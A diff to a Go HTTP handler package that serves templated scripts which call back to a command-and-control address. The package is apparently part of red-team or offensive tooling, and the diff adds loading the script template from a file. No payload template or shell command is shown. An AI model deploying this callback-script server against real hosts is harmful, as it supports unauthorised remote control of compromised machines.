@@ -5,7 +5,7 @@ package hsrv
  * HTTP handlers
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20240329
+ * Last Modified 20240425
  */
 
 import (
@@ -13,10 +13,13 @@ import (
 	_ "embed"
 	"errors"
 	"fmt"
+	"io/fs"
 	"math/rand"
 	"net"
 	"net/http"
+	"os"
 	"strconv"
+	"text/template"
 
 	"golang.org/x/net/idna"
 )
@@ -40,14 +43,28 @@ const C2Param = "c2"
 //go:embed script.tmpl
 var DefaultTemplate string
 
+// parseDefaultTemplate is the parsed form of DefaultTemplate.  We won't get
+// very far if it doesn't parse.
+var parsedDefaultTemplate = template.Must(
+	template.New("").Parse(DefaultTemplate),
+)
+
 // scriptHandler serves up a script for calling us back.  Hope we like fork and
 // exec...
 func (s *Server) scriptHandler(w http.ResponseWriter, r *http.Request) {
+	/* Work out the template to serve. */
+	tmpl, err := s.readTemplate()
+	if nil != err {
+		s.RErrorLogf(r, "Error reading template: %s", err)
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
+
 	/* Generate template parameters. */
 	c2, err := s.c2URL(r)
 	if nil != err {
 		s.RErrorLogf(r, "Could not determine callback URL: %s", err)
-		http.Error(w, "Huh?", http.StatusBadRequest)
+		w.WriteHeader(http.StatusBadRequest)
 		return
 	}
 	params := TemplateParams{
@@ -58,9 +75,9 @@ func (s *Server) scriptHandler(w http.ResponseWriter, r *http.Request) {
 
 	/* Execute the template and send it back. */
 	b := new(bytes.Buffer)
-	if err := s.tmpl.Execute(b, params); nil != err {
+	if err := tmpl.Execute(b, params); nil != err {
 		s.RErrorLogf(r, "Failed to execute callback template: %s", err)
-		http.Error(w, "Bother.", http.StatusInternalServerError)
+		w.WriteHeader(http.StatusInternalServerError)
 		return
 	}
 
@@ -114,4 +131,29 @@ func (s *Server) c2URL(r *http.Request) (string, error) {
 
 	/* Out of ideas at this point. */
 	return "", errors.New("out of ideas")
+}
+
+// getTemplate tries to get a template from s.tmplf.  If s.tmplf is the empty
+// string or s.tmplf doesn't exist, s.defTmpl is returned.
+func (s *Server) readTemplate() (*template.Template, error) {
+	/* If we don't have a file configured, life is easy. */
+	if "" == s.tmplf {
+		return s.defTmpl, nil
+	}
+
+	/* Read the template from the file. */
+	b, err := os.ReadFile(s.tmplf)
+	if errors.Is(err, fs.ErrNotExist) {
+		return s.defTmpl, nil
+	} else if nil != err {
+		return nil, fmt.Errorf("reading %s: %w", s.tmplf, err)
+	}
+
+	/* Parse it. */
+	tmpl, err := template.New("").Parse(string(b))
+	if nil != err {
+		return nil, fmt.Errorf("parsing %s: %w", s.tmplf, err)
+	}
+
+	return tmpl, nil
 }
